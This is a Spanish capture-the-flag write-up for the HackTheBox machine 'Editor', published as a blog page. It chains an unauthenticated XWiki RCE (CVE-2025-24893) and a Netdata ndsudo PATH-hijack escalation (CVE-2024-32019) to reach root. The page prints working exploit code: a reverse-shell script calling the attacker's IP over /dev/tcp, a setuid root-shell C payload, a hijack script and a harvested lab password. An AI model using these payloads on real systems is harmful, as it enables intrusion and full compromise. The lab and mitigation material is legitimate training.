@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Editor | ZsZsec</title>
+<meta content="Explotación de XWiki mediante CVE, ejecución remota, enumeración web y escalada local con análisis y mitigaciones." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Editor<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / XWiki / CVE</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">XWiki</span><span class="tag">CVE</span><span class="tag">RCE</span><span class="tag">Linux</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><hr/>
+<p>tags:</p>
+<ul>
+<li>CVE-2025-24893</li>
+<li>CVE-2024-32019</li>
+<li>xwiki</li>
+<li>jetty</li>
+<li>Nmap</li>
+<li>Path_Hijacking</li>
+<li>SUID</li>
+</ul>
+<hr/>
+<h1><strong>Introducción</strong></h1>
+<p>La máquina “Editor” presenta un entorno corporativo simulado donde convergen servicios web y herramientas de monitorización. La superficie de ataque inicial está compuesta únicamente por tres servicios expuestos: <strong>SSH</strong>, <strong>nginx</strong> y un servidor <strong>Jetty</strong> que aloja una instancia de <strong>XWiki</strong>. Durante la enumeración del servicio web se identifica una versión vulnerable de XWiki afectada por una vulnerabilidad crítica de ejecución remota sin autenticación (<strong>CVE-2025-24893</strong>), lo que permite comprometer la máquina de manera directa.<br/>
+Posteriormente, una vez obtenidas credenciales internas desde la propia instancia comprometida, se accede por SSH al sistema como usuario legítimo. Dentro del entorno local se descubre un binario con permisos <strong>SUID</strong>, <code>ndsudo</code>, perteneciente a Netdata y vulnerable a <strong>CVE-2024-32019</strong>, permitiendo la escalada de privilegios mediante un ataque de <strong>PATH Hijacking</strong> que deriva en una shell como <strong>root</strong>.</p>
+<h1>Reconocimiento</h1>
+<p>Para iniciar el proceso de enumeración realizamos un escaneo de puertos completo con <strong>Nmap</strong>, con el objetivo de identificar los servicios expuestos por la máquina víctima.</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Tue Nov 18 22:16:13 2025 as: /usr/lib/nmap/nmap --privileged -p- -Pn --min-rate 5000 -oN escaneo 10.10.11.80
+Nmap scan report for 10.10.11.80
+Host is up (0.096s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+</code></pre>
+<p>El resultado revela únicamente tres puertos abiertos: <strong>22 (SSH)</strong>, <strong>80 (HTTP)</strong> y <strong>8080 (HTTP-Proxy)</strong>. Esto sugiere que la superficie de ataque inicial se centrará en servicios web.</p>
+<hr/>
+<p>A continuación, realizamos un escaneo más profundo sobre los puertos previamente identificados, utilizando detección de servicios, versiones y scripts de enumeración:</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Tue Nov 18 22:17:28 2025 as: /usr/lib/nmap/nmap --privileged -p22,80,8080 --script=http-enum -sC -sV -O --min-rate 5000 -oN puertos 10.10.11.80
+Nmap scan report for 10.10.11.80
+Host is up (0.090s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http    Jetty 10.0.20
+|_http-server-header: Jetty(10.0.20)
+| http-enum: 
+|_  /robots.txt: Robots file
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Los servicios detectados son:</p>
+<ul>
+<li><strong>SSH</strong> → OpenSSH 8.9p1</li>
+<li><strong>HTTP</strong> → nginx 1.18.0</li>
+<li><strong>HTTP (Jetty)</strong> → Jetty 10.0.20</li>
+</ul>
+<p>Dada la presencia de Jetty en el puerto 8080, existe la posibilidad de que la máquina esté ejecutando alguna aplicación Java, posiblemente un panel o aplicación administrativa.</p>
+<hr/>
+<h2><strong>Enumeración Web</strong></h2>
+<p>Accediendo al servicio web alojado en el puerto <strong>8080</strong>, se presenta una interfaz simple sin demasiada información útil. Sin embargo, se observa la existencia de un subdominio llamado <strong><code>wiki</code></strong>, lo cual podría ser significativo si está asociado a un servicio como XWiki o un sistema de documentación que pueda ser vulnerable.</p>
+<p><img alt="Pasted image 20251119123358" src="https://github.com/user-attachments/assets/4cf2b876-7270-433a-8d7d-009bd948f884"/></p>
+<p>Para determinar si existían más subdominios relacionados con el dominio principal <code>editor.htb</code>, realizamos fuzzing de subdominios utilizando <strong>ffuf</strong>:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~/Desktop/hackthebox/editor]
+└─$ ffuf -u http://editor.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.editor.htb" -fs 154
+</code></pre>
+<p><img alt="Pasted image 20251119123542" src="https://github.com/user-attachments/assets/0bf941e4-2370-4aba-a2d1-04ca49408ff3"/></p>
+<p>El escaneo devuelve únicamente el subdominio existente:</p>
+<ul>
+<li><strong>wiki.editor.htb</strong></li>
+</ul>
+<p>Esto confirma que el subdominio <code>wiki</code> es el único disponible, por lo que será el siguiente punto natural de análisis.</p>
+<hr/>
+<h2><strong>Enumeración del Subdominio – XWiki</strong></h2>
+<p>Al acceder al subdominio identificado previamente (<code>wiki.editor.htb</code>), se presenta una instancia de <strong>XWiki</strong>. De inmediato, revisé la información de la instalación y encontré un dato crítico:</p>
+<p><img alt="Pasted image 20251119124004" src="https://github.com/user-attachments/assets/dcd84207-4967-427b-aa66-9f7b0a1d3a04"/></p>
+<p>La instancia está corriendo <strong>XWiki versión 15.10.8</strong>, una versión vulnerable a un fallo grave de <strong>ejecución remota de código sin autenticación (RCE)</strong>. <code>CVE-2025-24893 </code></p>
+<h1>CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro</h1>
+<p>La vulnerabilidad <strong>CVE-2025-24893</strong> permite a un atacante no autenticado ejecutar código Groovy de forma remota en el servidor mediante la macro <strong>SolrSearch</strong>. Esta macro procesa entradas del usuario y las evalúa directamente en un contexto Groovy, lo que abre la puerta a ejecución arbitraria.</p>
+<h3>Contexto de la Vulnerabilidad</h3>
+<p><strong>XWiki</strong> es una plataforma wiki empresarial de código abierto que utiliza:</p>
+<ul>
+<li><strong>Groovy</strong> → lenguaje de scripting incrustado</li>
+<li><strong>Solr</strong> → motor de búsqueda</li>
+<li><strong>Macros</strong> → bloques reutilizables de lógica que expanden la funcionalidad del wiki</li>
+</ul>
+<h3>Componente Vulnerable</h3>
+<p><strong>Macro SolrSearch</strong> (<code>Main.SolrSearchMacros</code>)</p>
+<ul>
+<li>Propósito: Búsqueda de texto completo mediante Solr</li>
+<li>Ubicación: <code>/xwiki/bin/view/Main/SolrSearchMacros</code></li>
+</ul>
+<h3>Análisis del Código</h3>
+<p>El problema principal está en la <strong>evaluación no segura</strong> de código Groovy:</p>
+<pre><code class="language-groovy">// CÓDIGO VULNERABLE
+def query = "search=${params.search}"  // Input directo sin sanitizar
+def result = evaluate(query)           // Ejecución peligrosa
+</code></pre>
+<p><strong>Problemas identificados:</strong></p>
+<ol>
+<li><strong>Falta de sanitización</strong> del parámetro <code>search</code></li>
+<li><strong>Uso de <code>evaluate()</code></strong> con entrada del usuario</li>
+<li><strong>Ausencia de restricciones</strong> de seguridad</li>
+</ol>
+<h3>Vector de Ataque</h3>
+<p><strong>Endpoint vulnerable:</strong></p>
+<pre><code class="language-text">GET /xwiki/bin/view/Main/SolrSearchMacros?search=PAYLOAD_GROOVY
+</code></pre>
+<p><strong>Condiciones de explotación:</strong></p>
+<ul>
+<li>No requiere autenticación (guest access suficiente)</li>
+<li>Instancia XWiki expuesta públicamente</li>
+<li>Versión afectada (pre-15.10.11, 16.4.1, 16.5.0RC1)</li>
+<li>Macro SolrSearch disponible</li>
+</ul>
+<h3>Prueba de Concepto (PoC)</h3>
+<p><strong>Ejemplo básico:</strong></p>
+<pre><code class="language-bash">curl "http://target/xwiki/bin/view/Main/SolrSearchMacros?search=groovy:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')"
+</code></pre>
+<p><strong>Estructura del payload:</strong></p>
+<pre><code class="language-bash">groovy:[CÓDIGO_GROOVY_ARBITRARIO]
+</code></pre>
+<h1><strong>Explotación – Reverse Shell</strong></h1>
+<p>Para automatizar la explotación de la RCE conseguí un pequeño script en Bash que:</p>
+<ol>
+<li>Prepara un payload Groovy que ejecuta un comando remoto.</li>
+<li>Codifica una reverse shell en Base64.</li>
+<li>Construye el payload final para SolrSearch.</li>
+<li>Lo envía mediante <code>curl</code>.</li>
+</ol>
+<pre><code class="language-bash">RHOST="editor.htb:8080"
+LHOST="10.10.15.237"
+LPORT=4444
+
+SHELL="bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.237/4444 0&gt;&amp;1'"
+
+B64=$(echo -n "$SHELL" | base64 -w0)
+
+RAW='}}}{{async async=false}}{{groovy}}"bash -c {echo,'$B64'}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}'
+
+PAYLOAD=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$RAW")
+
+curl "http://$RHOST/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=${PAYLOAD}"
+</code></pre>
+<p>Este sera el codigo que nos otorgara ejecucion remota de comandos, simplemente le damos permisos de ejecucion con <code>chmod</code> lo ejecutamos y nos ponemos en escucha por el puerto <code>4444</code></p>
+<h1><strong>Post-Explotación – Credenciales en Configuración</strong></h1>
+<p>XWiki utiliza Hibernate para conectarse a la base de datos. Las credenciales se almacenan en <strong><code>/etc/xwiki/hibernate.cfg.xml</code></strong>, por lo que busqué dicho archivo desde la shell:</p>
+<p><img alt="Pasted image 20251119130514" src="https://github.com/user-attachments/assets/14fac79c-a3d3-4d38-bb13-86063684b43d"/></p>
+<p>El archivo devolvió varias líneas, pero una de ellas contenía la contraseña legítima:</p>
+<pre><code>theEd1t0rTeam99</code></pre>
+<p>Y en el sistema enumeramos a un usuario llamado <code>oliver</code>, así que teniendo en cuenta que conocemos la existencia de ese usuario y que se esta usando el servicio <code>OpenSSH</code>, procederemos a intentar conectarnos de forma legitima con las credenciales que nos encontramos.</p>
+<h1><strong>Escalada de Privilegios – Abuso del binario SUID <code>ndsudo</code> (CVE-2024-32019)</strong></h1>
+<p>Una vez dentro de la máquina con acceso legítimo mediante SSH, procedí a realizar una enumeración local estándar en busca de binarios con el bit <strong>SUID</strong> activado. Esto es importante, ya que cualquier binario ejecutado con SUID root puede potencialmente utilizarse para elevar privilegios.</p>
+<pre><code class="language-bash">oliver@editor:/$ find / -perm -4000 2&gt;/dev/null
+/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+</code></pre>
+<pre><code>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</code></pre>
+<p>Este binario pertenece a <strong>Netdata</strong>, un agente de monitorización. Investigando más a fondo, descubrí que <code>ndsudo</code> es vulnerable a <strong>CVE-2024-32019</strong>, una vulnerabilidad crítica de escalada de privilegios.</p>
+<h1><strong>CVE-2024-32019 – Netdata <code>ndsudo</code> Privilege Escalation (SUID + PATH Hijacking)</strong></h1>
+<p>El binario <code>ndsudo</code> está diseñado para permitir que ciertos usuarios ejecuten comandos limitados como root. Sin embargo, debido a un fallo de diseño, el binario restringe solo <em>el nombre</em> del comando, pero <strong>resuelve la ruta del ejecutable usando la variable de entorno PATH del usuario</strong>.</p>
+<p>Esto significa que, si colocamos un archivo malicioso con un nombre permitido (por ejemplo, <code>nvme</code> o <code>nvme-list</code>) en un directorio que esté <strong>antes</strong> en el PATH, <code>ndsudo</code> lo ejecutará <strong>como root</strong>.</p>
+<hr/>
+<h3><strong>Requisitos cumplidos por la máquina:</strong></h3>
+<ul>
+<li>El binario <code>ndsudo</code> tiene SUID root.</li>
+<li>Netdata es vulnerable (versión afectada).</li>
+<li>El usuario puede controlar el PATH.</li>
+<li>Existen comandos permitidos como <code>nvme-list</code> que podemos suplantar.</li>
+</ul>
+<hr/>
+<h1><strong>Preparación del Payload</strong></h1>
+<p>Para aprovechar la vulnerabilidad, compilé un pequeño payload en C con el objetivo de obtener una shell como root:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+</code></pre>
+<h2>Compilación</h2>
+<pre><code class="language-bash">gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
+</code></pre>
+<p>Para llevar a cabo la <strong>escalada de privilegios</strong>, primero serví desde mi máquina atacante el binario <strong><code>nvme</code></strong> ya compilado utilizando un servidor web simple en Python.</p>
+<p><img alt="Pasted image 20251119134006" src="https://github.com/user-attachments/assets/eaf3e851-26ee-4d04-925f-10a3c8026e1f"/></p>
+<p>Luego, desde la máquina víctima descargué el binario junto con el script de explotación correspondiente:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+# Search for ndsudo SUID
+ndsudo_path=$(find / -type f -name "ndsudo" -perm -4000 -print 2&gt;/dev/null)
+
+# Check it was found
+if [ -z "$ndsudo_path" ]; then
+    echo "[!] No SUID binary named ndsudo was found."
+    exit 1
+fi
+
+echo "[+] ndsudo found at: $ndsudo_path"
+
+# Check existence of ./nvme payload
+if [ -f "./nvme" ]; then
+    echo "[+] File 'nvme' found in the current directory."
+    chmod +x ./nvme
+    echo "[+] Execution permissions granted to ./nvme"
+else
+    echo "[!] The file 'nvme' was not found in the current directory."
+    exit 1
+fi
+
+# Modify PATH and execute the SUID binary with nvme-list
+echo "[+] Running ndsudo with modified PATH:"
+PATH="$(pwd):$PATH" "$ndsudo_path" nvme-list
+</code></pre>
+<p>Este script aprovecha la vulnerabilidad <strong>CVE-2024-32019</strong>, la cual afecta al binario <code>ndsudo</code> utilizado por Netdata. El exploit funciona colocando un binario malicioso (<code>nvme</code>) en el <code>PATH</code>, de forma que cuando <code>ndsudo</code> lo invoque, en realidad ejecute nuestro payload.</p>
+<p>El script:</p>
+<ol>
+<li>Localiza <code>ndsudo</code></li>
+<li>Verifica que <code>nvme</code> (nuestro payload) esté presente</li>
+<li>Modifica PATH para que el directorio actual esté <strong>primero</strong></li>
+<li>Ejecuta <code>ndsudo nvme-list</code></li>
+<li>Netdata intenta ejecutar <code>nvme-list</code>, pero al buscar en PATH encuentra <strong>nuestro payload</strong> → ejecución como <strong>root</strong></li>
+</ol>
+<p>Una vez descargados ambos archivos, asigné permisos de ejecución al script y lo ejecute</p>
+<p><img alt="Pasted image 20251119134057" src="https://github.com/user-attachments/assets/6b78e461-d076-4cad-93f4-d81888babc19"/></p>
+<p>El exploit funcionó correctamente, obteniendo una shell como <strong>root</strong>:</p>
+<h1>Flujo de ataque</h1>
+<pre><code class="language-java">                    ┌──────────────────────────────────┐
+                    │     1. Reconocimiento (Nmap)      │
+                    │  Puertos abiertos: 22, 80, 8080   │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 2. Enumeración Web               │
+                    │ Descubrimiento del subdominio    │
+                    │ wiki.editor.htb                  │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 3. XWiki 15.10.8 vulnerable      │
+                    │ CVE-2025-24893 (RCE sin auth)    │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 4. Ejecución Remota de Comandos  │
+                    │ Reverse shell desde SolrSearch   │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 5. Post-Explotación:             │
+                    │ Credenciales DB en               │
+                    │ /etc/xwiki/hibernate.cfg.xml     │
+                    │ → Contraseña encontrada           │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 6. Acceso por SSH como “oliver”  │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 7. Enumeración local             │
+                    │ ndsudo SUID vulnerable           │
+                    │ CVE-2024-32019                   │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │ 8. PATH Hijacking → Ejecución    │
+                    │ de payload “nvme” como root       │
+                    └──────────────────────────────────┘
+                                   │
+                                   ▼
+                    ┌──────────────────────────────────┐
+                    │      9. Root en la máquina       │
+                    └──────────────────────────────────┘
+
+</code></pre>
+<h1><strong>Conclusión</strong></h1>
+<p>La máquina “Editor” permite demostrar dos vectores importantes en un entorno real:</p>
+<ol>
+<li><strong>El impacto de un servicio web desactualizado</strong> (XWiki 15.10.8) expuesto en Internet, que permite la ejecución remota sin autenticación mediante una macro vulnerable del motor SolrSearch.</li>
+<li><strong>El riesgo de binarios SUID mal diseñados</strong>, especialmente aquellos que confían en variables de entorno controlables por el usuario, como el caso de <code>ndsudo</code> vulnerable a <strong>CVE-2024-32019</strong>.</li>
+</ol>
+<p>La explotación encadena ambas vulnerabilidades para obtener un compromiso total del sistema, desde acceso remoto inicial hasta escalada de privilegios. El flujo de ataque demuestra cómo malas prácticas de configuración y mantenimiento pueden conducir al control completo de una infraestructura.</p>
+<h1><strong>Mitigaciones</strong></h1>
+<h2><strong>1. Actualización de XWiki</strong></h2>
+<ul>
+<li>Actualizar <strong>XWiki a 15.10.11</strong> o versiones superiores:<ul>
+<li>16.4.1</li>
+<li>16.5.0RC1</li>
+</ul>
+</li>
+<li>Deshabilitar temporalmente la macro <strong>SolrSearch</strong> si no se utiliza.</li>
+<li>Restringir acceso público al panel <code>/xwiki/bin/</code>.</li>
+</ul>
+<h2><strong>2. Configuración Segura</strong></h2>
+<ul>
+<li>Aplicar <strong>control de acceso</strong>, evitando acceso de invitados (<em>guest access</em>) en instancias XWiki públicas.</li>
+<li>Deshabilitar ejecución de scripts Groovy desde macros cuando no es estrictamente necesario.</li>
+</ul>
+<h2><strong>3. Protección contra SUID Vulnerables</strong></h2>
+<ul>
+<li>Eliminar o corregir <code>ndsudo</code> afectado:<ul>
+<li>Actualizar a una versión de Netdata donde <code>ndsudo</code> haya sido parcheado.</li>
+</ul>
+</li>
+<li>Evitar SUID innecesarios.</li>
+<li>Implementar <strong>fs.protected_symlinks/hardlinks</strong> y <strong>secure_path</strong> en sudoers.</li>
+</ul>
+<h2><strong>Restricciones del PATH</strong></h2>
+<ul>
+<li>Configurar:</li>
+</ul>
+<pre><code class="language-bash">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+</code></pre>
+<ul>
+<li>Evitar que aplicaciones privilegiadas respeten el PATH del usuario.</li>
+</ul>
+<h2><strong>5. Seguridad del sistema</strong></h2>
+<ul>
+<li><p>Auditar binarios SUID con herramientas como:</p>
+<ul>
+<li><code>linpeas.sh</code></li>
+<li><code>Pspy</code></li>
+</ul>
+</li>
+<li><p>Rotar periódicamente contraseñas de servicios y bases de datos.</p>
+</li>
+<li><p>Aplicar hardening general del sistema (AppArmor/SELinux).</p>
+</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
